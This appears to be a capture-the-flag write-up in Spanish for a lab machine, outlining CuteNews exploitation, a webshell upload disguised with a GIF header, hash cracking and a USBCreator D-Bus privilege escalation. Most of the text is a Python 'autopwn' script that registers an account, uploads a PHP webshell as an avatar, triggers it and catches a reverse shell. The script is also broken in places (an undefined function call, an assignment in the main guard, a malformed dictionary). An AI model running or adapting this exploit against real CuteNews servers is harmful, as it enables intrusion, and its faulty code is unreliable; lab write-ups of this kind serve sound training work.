## Tecnicas utilizadas
-   CuteNews Exploitation
-   Code Analysis
-   USBCreator D-Bus Privilege Escalation
-   Python Exploit Development (AutoPwn)
## Procedimiento
- Web Discovery without conventional fuzzing software because the page use Fail2ban plugin.
- Consulta en searchsploit para conocer si hay alguna vulnerabilidad para el gestor de contenido *CuteNews*
- Subir un web shell con la cabezera de un gif(**GIF8;**) escrito en php para bypassear la subida de imagenes del panel de perfil. Establecer una reverse shell.
-> python scripting(autopwn)
``` python
#!/usr/bin/python3

from pwn import * #pip3 install pwntools
import pdb #Debuggin
import re #Regex
import requests
import signal
import time
import threading

def def_handler(sig, frame):
	print("\n[!] Saliendo...")
	sys.exit(1)

#ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Uso del programa
if len(sys.argv) != 5:
	print("\n\n[!] Uso: python3 " + sys.argv[0] + " http://<victim-ip>/CuteNews/ Usuario Contraseña filename.php" )
	sys.exit(1)

#Variables globales
main_url = sys.argv[1] 
user = sys.argv[2]
password = sys.argv[3]
filename = sys.argv[4]
lport = 443

register_url = main_url + "index.php?register"
get_values_url = main_url + "index.php?mod=main&opt=personal"
login_url = main_url + "index.php"
rce_url = main_url + "uploads/avatar_%s_%s" % (user, filename)


def register():
	post_data = {
		'<data extracted from the burpsuite display>'
	}
	
	r = requests.post(register_url, data=post_data)

def uploadFile():
	s = requests.session()
	
	post_data = {
		"<data extracted from the burpsuite display>"
	}
	
	r = s.post(login_url, data=post_data)
	r = s.get(get_values_url)
	
	signatureKey = re.findall(r'name="__signature_key" value="(.*?)" ', r.text)[0]
	signatureDsi = re.findall(r'name="__signature_dsi" value="(.*?)" ', r.text)[0]
	
	post_data = {
		"<data extracted from the burpsuite display>"
	}
	f = open(filename, "r")
	content = f.read()
	
	file_to_upload = {'avatar_file:' (filename, content)}
	r = s.post(login_url, data=post_data, files=file_to_upload)
	
	r = s.get(rce_url)


if __name__ = "__main__":
	registerUser()
	
	try:
		threading.Thread(target = uploadFile, args=()).start()
	except Exception as e:
		log.error(str(e))
	
	shell = listen(lport, timeout=20).wait_for_connection()
	shell.interactive()
```
- Analisis del codigo fuente para ver donde almacen los datos CuteNews.
- Romper hashes y user pivoting para convertirnos en los dos diferentes perfiles existentes.
- Explotamos la vulnerabilidad de USBcreator guiandonos del exploit de palo alto.''